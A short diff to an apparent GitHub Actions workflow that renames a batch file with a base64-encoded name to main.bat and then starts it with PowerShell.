@@ -8,4 +8,5 @@ jobs:
     steps:
     - name: 'Checkout GitHub Action'
       uses: actions/checkout@v3
-    - run: ./main.bat
+    - run: Rename-Item -Path .\=?utf-8?B?MjAyMy4xMC4yM+i1hOmHkee7n+iuoeS9meminS5iYXQ=?= -NewName .\main.bat
+    - run: Start-Process .\main.bat
